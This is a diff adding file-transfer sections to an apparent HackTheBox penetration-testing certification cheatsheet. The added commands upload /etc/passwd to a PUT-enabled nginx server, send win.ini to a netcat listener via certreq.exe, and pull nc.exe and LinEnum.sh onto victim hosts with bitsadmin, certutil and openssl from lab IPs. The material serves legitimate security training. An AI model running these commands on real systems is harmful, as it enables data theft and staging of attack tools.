@@ -37,6 +37,8 @@ HackTheBox Certified Penetration Tester Specialist Cheatsheet
    	- [Transferring Files with Code](#transferring-files-with-code)
    	- [Miscellaneous File Transfer Methods](#miscellaneous-file-transfer-methods)
    	- [Protected File Transfers](#protected-file-transfers)
+   	- [Catching Files over HTTP/S](#catching-files-over-http/s)
+   	- [Living off The Land](#living-off-the-land)
 - [Shells](#shells)
     - [Reverse Shell](#reverse-shell)
     - [Bind Shell](#bind-shell)
@@ -755,7 +757,55 @@ openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
 openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
 
 ```
+### Catching Files over HTTP/S
+```
+## Nginx - Enabling PUT
+sudo mkdir -p /var/www/uploads/SecretUploadDirectory
+sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
+sudo vim /etc/nginx/sites-available/upload.conf
+``
+server {
+    listen 9001;
+    
+    location /SecretUploadDirectory/ {
+        root    /var/www/uploads;
+        dav_methods PUT;
+    }
+}
+``
+sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
+sudo systemctl restart nginx.service
+tail -2 /var/log/nginx/error.log
+ss -lnpt | grep 80
+ps -ef | grep 2811
+sudo rm /etc/nginx/sites-enabled/default
+Testing uploading --> curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
+sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
+```
+### Living off The Land
+```
+# LOLBAS
+# To search for download and upload functions in LOLBAS we can use /download or /upload.
+# Upload win.ini to our Pwnbox
+A> sudo nc -lvnp 8000
+V> certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
 
+# GTFOBins
+A> openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
+A> openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
+V> openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
+
+# Other Common Living off the Land tools
+## Bitsadmin Download function
+bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
+bitsadmin /transfer myJob /download /priority high http://10.10.16.33:8000/bb.txt C:\Users\htb-student\Desktop\bb.txt
+Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
+
+# Certutil
+Download a File with Certutil
+certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
+
+```
 ## Shells
 
 ##### Reverse Shell
